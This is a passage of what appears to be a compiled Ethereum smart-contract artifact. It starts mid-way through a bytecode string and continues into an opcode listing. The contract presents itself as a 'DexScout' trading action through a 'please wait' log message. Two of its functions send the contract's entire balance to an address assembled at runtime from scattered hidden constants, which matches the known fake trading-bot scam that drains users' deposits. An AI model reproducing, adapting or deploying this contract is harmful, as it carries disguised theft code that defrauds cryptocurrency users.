1610cc3565b5b828206905092915050565b5f610d8782610bb2565b9150610d9283610bb2565b9250828203905081811115610daa57610da9610b17565b5b92915050565b5f60ff82169050919050565b5f610dc682610db0565b9150610dd183610db0565b9250828201905060ff811115610dea57610de9610b17565b5b92915050565b5f610dfa82610db0565b9150610e0583610db0565b9250828203905060ff811115610e1e57610e1d610b17565b5b9291505056fea2646970667358221220963d0e952981ac70d7f98142e819f5fa07d24467409200d15dcec748ab05d6ef64736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x10 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x13EC CODESIZE SUB DUP1 PUSH3 0x13EC DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x36 SWAP2 SWAP1 PUSH3 0x1E6 JUMP JUMPDEST DUP2 PUSH1 0x1 SWAP1 DUP2 PUSH3 0x47 SWAP2 SWAP1 PUSH3 0x4A0 JUMP JUMPDEST POP DUP1 PUSH0 SWAP1 DUP2 PUSH3 0x58 SWAP2 SWAP1 PUSH3 0x4A0 JUMP JUMPDEST POP POP POP PUSH3 0x584 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH3 0xC2 DUP3 PUSH3 0x7A JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH3 0xE4 JUMPI PUSH3 0xE3 PUSH3 0x8A JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH3 0xF8 PUSH3 0x61 JUMP JUMPDEST SWAP1 POP PUSH3 0x106 DUP3 DUP3 PUSH3 0xB7 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH3 0x128 JUMPI PUSH3 0x127 PUSH3 0x8A JUMP JUMPDEST JUMPDEST PUSH3 0x133 DUP3 PUSH3 0x7A JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x15F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x142 JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH3 0x180 PUSH3 0x17A DUP5 PUSH3 0x10B JUMP JUMPDEST PUSH3 0xED JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH3 0x19F JUMPI PUSH3 0x19E PUSH3 0x76 JUMP JUMPDEST JUMPDEST PUSH3 0x1AC DUP5 DUP3 DUP6 PUSH3 0x140 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x1CB JUMPI PUSH3 0x1CA PUSH3 0x72 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH3 0x1DD DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH3 0x16A JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x1FF JUMPI PUSH3 0x1FE PUSH3 0x6A JUMP JUMPDEST JUMPDEST PUSH0 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x21F JUMPI PUSH3 0x21E PUSH3 0x6E JUMP JUMPDEST JUMPDEST PUSH3 0x22D DUP6 DUP3 DUP7 ADD PUSH3 0x1B4 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x251 JUMPI PUSH3 0x250 PUSH3 0x6E JUMP JUMPDEST JUMPDEST PUSH3 0x25F DUP6 DUP3 DUP7 ADD PUSH3 0x1B4 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x2B8 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x2CE JUMPI PUSH3 0x2CD PUSH3 0x273 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP DUP2 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x8 DUP4 MUL PUSH3 0x332 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH3 0x2F5 JUMP JUMPDEST PUSH3 0x33E DUP7 DUP4 PUSH3 0x2F5 JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x388 PUSH3 0x382 PUSH3 0x37C DUP5 PUSH3 0x356 JUMP JUMPDEST PUSH3 0x35F JUMP JUMPDEST PUSH3 0x356 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x3A3 DUP4 PUSH3 0x368 JUMP JUMPDEST PUSH3 0x3BB PUSH3 0x3B2 DUP3 PUSH3 0x38F JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH3 0x301 JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH0 SWAP1 JUMP JUMPDEST PUSH3 0x3D1 PUSH3 0x3C3 JUMP JUMPDEST PUSH3 0x3DE DUP2 DUP5 DUP5 PUSH3 0x398 JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0x405 JUMPI PUSH3 0x3F9 PUSH0 DUP3 PUSH3 0x3C7 JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH3 0x3E4 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0x454 JUMPI PUSH3 0x41E DUP2 PUSH3 0x2D4 JUMP JUMPDEST PUSH3 0x429 DUP5 PUSH3 0x2E6 JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0x439 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH3 0x451 PUSH3 0x448 DUP6 PUSH3 0x2E6 JUMP JUMPDEST DUP4 ADD DUP3 PUSH3 0x3E3 JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x476 PUSH0 NOT DUP5 PUSH1 0x8 MUL PUSH3 0x459 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x490 DUP4 DUP4 PUSH3 0x465 JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0x4AB DUP3 PUSH3 0x269 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x4C7 JUMPI PUSH3 0x4C6 PUSH3 0x8A JUMP JUMPDEST JUMPDEST PUSH3 0x4D3 DUP3 SLOAD PUSH3 0x2A0 JUMP JUMPDEST PUSH3 0x4E0 DUP3 DUP3 DUP6 PUSH3 0x409 JUMP JUMPDEST PUSH0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0x516 JUMPI PUSH0 DUP5 ISZERO PUSH3 0x501 JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH3 0x50D DUP6 DUP3 PUSH3 0x483 JUMP JUMPDEST DUP7 SSTORE POP PUSH3 0x57C JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH3 0x526 DUP7 PUSH3 0x2D4 JUMP JUMPDEST PUSH0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0x54F JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x528 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH3 0x56F JUMPI DUP5 DUP10 ADD MLOAD PUSH3 0x56B PUSH1 0x1F DUP10 AND DUP3 PUSH3 0x465 JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0xE5A DUP1 PUSH3 0x592 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x56 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x54 PUSH2 0xE2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5E PUSH2 0x164 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x8D SWAP1 PUSH2 0x9E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x9D PUSH2 0x19B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xDF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x10F SWAP1 PUSH2 0xA72 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x11F PUSH2 0x1B1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x191 SWAP1 PUSH2 0xADA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x1AC PUSH2 0x1A7 PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C2 PUSH2 0x1BD PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x1D2 PUSH2 0x5D2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x1EC PUSH2 0x5DC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x1F7 PUSH2 0x5E6 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x248 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x243 PUSH2 0x23E PUSH2 0x5F1 JUMP JUMPDEST PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x25D DUP3 PUSH2 0x258 DUP10 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x27A PUSH2 0x26C DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x275 DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x286 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x292 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2B1 PUSH2 0x2A2 DUP7 DUP7 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x2AC DUP6 DUP6 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x71D JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x5C5 JUMPI PUSH2 0x100 DUP5 PUSH2 0x32C SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x341 JUMPI PUSH2 0x340 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x362 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x373 JUMPI PUSH2 0x372 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3C4 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3DD JUMPI PUSH1 0x57 DUP4 PUSH2 0x3D6 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x489 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x41B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x434 JUMPI PUSH1 0x37 DUP4 PUSH2 0x42D SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x488 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x472 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x487 JUMPI PUSH1 0x30 DUP4 PUSH2 0x484 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4E0 JUMPI PUSH1 0x57 DUP3 PUSH2 0x4D9 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58C JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x51E JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x537 JUMPI PUSH1 0x37 DUP3 PUSH2 0x530 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58B JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x575 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x58A JUMPI PUSH1 0x30 DUP3 PUSH2 0x587 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x59A SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST PUSH2 0x5A4 SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST DUP5 PUSH2 0x5AF SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x5BE SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST SWAP1 POP PUSH2 0x315 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x62D JUMPI DUP2 DUP1 PUSH2 0x616 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP1 POP PUSH2 0x604 JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x648 JUMPI PUSH2 0x647 PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x67A JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x711 JUMPI PUSH1 0x10 DUP7 PUSH2 0x694 SWAP2 SWAP1 PUSH2 0xD4D JUMP JUMPDEST SWAP3 POP PUSH2 0x69F DUP4 PUSH2 0x8A3 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x6AE SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST PUSH2 0x6B8 SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x6C9 JUMPI PUSH2 0x6C8 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x704 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x67F JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x736 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x781 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x80F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7AA JUMPI PUSH2 0x7A9 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x7C1 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x7D4 JUMPI PUSH2 0x7D3 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x78E JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x894 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x82F JUMPI PUSH2 0x82E PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x846 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x859 JUMPI PUSH2 0x858 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x813 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8F9 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8EF SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x911 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x95B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x947 SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH2 0x951 SWAP2 SWAP1 PUSH2 0xDF0 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52756E6E696E672044657853636F757420616374696F6E2E2054686973206361 PUSH0 DUP3 ADD MSTORE PUSH32 0x6E2074616B652061207768696C653B20706C6561736520776169742E2E000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9CE PUSH1 0x3D DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0x9D9 DUP3 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9FB DUP2 PUSH2 0x9C2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP 